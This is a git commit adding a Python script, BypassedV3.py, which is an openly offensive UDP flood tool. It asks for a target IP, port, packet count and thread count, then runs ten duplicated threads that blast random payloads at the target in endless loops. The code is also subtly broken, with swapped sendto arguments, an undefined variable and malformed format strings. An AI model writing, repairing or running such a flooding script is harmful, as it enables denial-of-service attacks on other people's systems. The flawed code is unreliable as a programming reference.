2e91e3c33477e30fe2a36e3e45ab0bc4b14a2a7e
Leons09 <101995811+Leons09@users.noreply.github.com>
2022-03-30 05:31:10 +0700

    Add files via upload

---
+++ BypassedV3.py
@@ -0,0 +1,151 @@
+import random
+import time
+import socket
+import threading
+print("\033[31m")
+ip = str(input("====> Ip Hosting: "))
+port = int(input("====> Port Hosting: "))
+choice = str(input("====> Attacking? (y/n): "))
+times = int(input("====> Packets: "))
+threads = int(input("====> Threads: "))
+
+def ext1():
+  data = random._urandom(589)
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      addr = (str(ip),int(port))
+      for x in range(times):
+        s.sendto(addr,data)
+        print(i +"\033[31;1Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
+    except:
+      print(i +"\033[31;1Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
+
+def ext2():
+  data = random._urandom(589)
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      addr = (str(ip),int(port))
+      for x in range(times):
+        s.sendto(addr,data)
+        print(i +"\033[31;1Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
+    except:
+      print(i +"\033[31;1Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
+def ext3():
+  data = random._urandom(589)
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      addr = (str(ip),int(port))
+      for x in range(times):
+        s.sendto(addr,data)
+        print(i +"\033[31;1Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
+    except:
+      print(i +"\033[31;1Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
+def ext4():
+  data = random._urandom(589)
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      addr = (str(ip),int(port))
+      for x in range(times):
+        s.sendto(addr,data)
+        print(i +"\033[31;1Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
+    except:
+      print(i +"\033[31;1Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
+
+def ext5():
+  data = random._urandom(589)
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      addr = (str(ip),int(port))
+      for x in range(times):
+        s.sendto(addr,data)
+        print(i +"\033[31;1Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
+    except:
+      print(i +"\033[31;1Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
+
+def ext6():
+  data = random._urandom(589)
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      addr = (str(ip),int(port))
+      for x in range(times):
+        s.sendto(addr,data)
+        print(i +"\033[31;1Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
+    except:
+      print(i +"\033[31;1Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
+
+def ext7():
+  data = random._urandom(589)
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      addr = (str(ip),int(port))
+      for x in range(times):
+        s.sendto(addr,data)
+        print(i +"\033[31;1Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
+    except:
+      print(i +"\033[31;1Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
+
+def ext8():
+  data = random._urandom(589)
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      addr = (str(ip),int(port))
+      for x in range(times):
+        s.sendto(addr,data)
+        print(i +"\033[31;1Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
+    except:
+      print(i +"\033[31;1Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
+
+def ext9():
+  data = random._urandom(589)
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      addr = (str(ip),int(port))
+      for x in range(times):
+        s.sendto(addr,data)
+        print(i +"\033[31;1Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
+    except:
+      print(i +"\033[31;1Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
+
+def ext10():
+  data = random._urandom(589)
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      addr = (str(ip),int(port))
+      for x in range(times):
+        s.sendto(addr,data)
+        print(i +"\033[31;1Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
+    except:
+      print(i +"\033[31;1Exaults Attacked Ip Port \033[30;1m{ip}:{port}")
+
+for y in range(threads):
+  if choice == "y":
+    th = threading.Thread(target = ext1)
+    th.start()
+    th = threading.Thread(target = ext2)
+    th.start()
+    th = threading.Thread(target = ext3)
+    th.start()
+    th = threading.Thread(target = ext4)
+    th.start()
+    th = threading.Thread(target = ext5)
+    th.start()
+    th = threading.Thread(target = ext6)
+    th.start()
+    th = threading.Thread(target = ext7)
+    th.start()
+    th = threading.Thread(target = ext8)
+    th.start()
+    th = threading.Thread(target = ext9)
+    th.start()
+    th = threading.Thread(target = ext10)
+    th.start()
